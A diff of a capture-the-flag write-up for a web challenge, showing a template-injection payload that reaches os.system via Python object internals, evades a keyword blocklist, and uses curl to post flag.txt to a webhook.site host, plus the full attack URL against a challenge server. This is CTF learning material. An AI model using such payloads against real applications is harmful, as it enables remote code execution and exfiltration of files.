@@ -1,6 +1,6 @@
 ---
 created: 2021-12-21T23:50
-updated: 2024-06-10T23:38
+updated: 2024-06-21T21:30
 ---
 
 ## Super Secure Trustable Implementation
@@ -104,7 +104,7 @@ Hello, {'__name__': 'builtins' ... '__import__': <built-in function __import__>,
 **Hooray!** We found `__import__`, now we just have to combine the payload into
 
 ```python
-{{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").system("curl -X POST --data-binary @flflag.txtag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9")}}
+{{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").system("curl -X POST --data-binary @flflag.txtag.txt https://webhook.site")}}
 ```
 
 `flag.txt` is manually bypassed since it contains `flag`
@@ -112,16 +112,16 @@ Hello, {'__name__': 'builtins' ... '__import__': <built-in function __import__>,
 ### Transforming the payload
 
 ```
-{read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_["_read_builtins_read_"])["_read_im"+"port_read_"]("o"+"s").sreadystem("curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9")}read}
+{read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_["_read_builtins_read_"])["_read_im"+"port_read_"]("o"+"s").sreadystem("curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site")}read}
 
-<h1> Hello, {{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").system("curl -X POST --data-binary @flag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9")}}
+<h1> Hello, {{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").system("curl -X POST --data-binary @flag.txt https://webhook.site")}}
 ```
 
 The first line is our payload, and after running the same blocklist operations as the server, the resulting string looks ok.
 
 ### Sending the payload
 
-`http://35.240.143.82:4209/?name={read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_["_read_builtins_read_"])["_read_im"+"port_read_"]("o"+"s").sreadystem("curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9")}read}`
+`http://35.240.143.82:4209/?name={read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_["_read_builtins_read_"])["_read_im"+"port_read_"]("o"+"s").sreadystem("curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site")}read}`
 
 And after checking webhook.site
 
